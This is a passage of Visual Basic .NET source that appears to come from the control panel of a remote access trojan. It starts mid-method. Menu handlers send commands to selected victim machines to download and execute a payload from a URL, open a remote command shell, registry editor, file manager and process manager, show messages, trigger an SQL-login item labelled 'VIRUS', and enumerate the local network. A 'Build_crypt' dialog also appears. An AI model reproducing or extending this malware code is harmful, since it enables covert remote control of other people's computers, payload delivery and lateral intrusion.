            b = a.Replace("#1", URL).Replace("#2", num).Replace("#3", TYPE)
            If URL = "" Or TYPE = "" Then
                MessageBox.Show("Re-Write the Link and Type Run", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop)
            Else
                If (b <> "") Then
                    Dim enumerator As IEnumerator
                    Try
                        enumerator = L1.SelectedItems.GetEnumerator
                        Do While enumerator.MoveNext
                            Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                            NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {("exc" & FUNC.SPL & b)}, Nothing, Nothing, Nothing, True)
                        Loop
                    Finally
                        If TypeOf enumerator Is IDisposable Then
                            TryCast(enumerator, IDisposable).Dispose()
                        End If
                    End Try
                End If
            End If
        End If
    End Sub

    Private Sub ToolStripStatusLabel3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripStatusLabel3.Click
        Build_crypt.ShowDialog()
    End Sub

    Private Sub ToolStripStatusLabel1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripStatusLabel1.Click
        If L1.Visible = False Then
            ToolStripStatusLabel1.Text = "[ Logs ]"
            L1.Visible = True
            L1.BringToFront()
            Lv1.SendToBack()
        Else
            ToolStripStatusLabel1.Text = "[ Users ]"
            L1.Visible = False
            Lv1.BringToFront()
            L1.SendToBack()
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        On Error Resume Next
        Dim enumerator As IEnumerator
        Dim num As Integer = 0
        enumerator = Me.L1.Items.GetEnumerator
        Do While enumerator.MoveNext
            Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
            If (current.SubItems.Item(8).Text.Contains("YES - ") Or current.SubItems.Item(8).Text.Contains("tru") Or current.SubItems.Item(8).Text.Contains("rue") Or current.SubItems.Item(8).Text.Contains("yes") Or current.SubItems.Item(8).Text.Contains("YES")) Then
                num += 1
                current.BackColor = Color.WhiteSmoke
                current.ForeColor = Color.Yellow
            End If
        Loop
        If TypeOf enumerator Is IDisposable Then
            TryCast(enumerator, IDisposable).Dispose()
        End If
    End Sub


    Private Sub MsgBoxToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles MsgBoxToolStripMenuItem.Click

        Dim msg_b As String = InputBox("Enter your Message", "Message Entry", "You Suck")
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {"msg" & FUNC.SPL & msg_b & FUNC.SPL}, Nothing, Nothing, Nothing, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RegeditToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RegeditToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {"open_reg" & FUNC.SPL}, Nothing, Nothing, Nothing, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FileManagerToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {"open_fm" & FUNC.SPL}, Nothing, Nothing, Nothing, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {"open_proc" & FUNC.SPL}, Nothing, Nothing, Nothing, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub CmdShellToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CmdShellToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {"open_cmd" & FUNC.SPL}, Nothing, Nothing, Nothing, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub ToolStripStatusLabel2_Click_1(sender As System.Object, e As System.EventArgs) Handles ToolStripStatusLabel2.Click
        NonAb.Show()
    End Sub

    Private Sub VIRUSToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles VIRUSToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {"open_Sql_login" & FUNC.SPL}, Nothing, Nothing, Nothing, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub LANEnumeriationToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LANEnumeriationToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {"open_lan_enum" & FUNC.SPL}, Nothing, Nothing, Nothing, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub
End Class
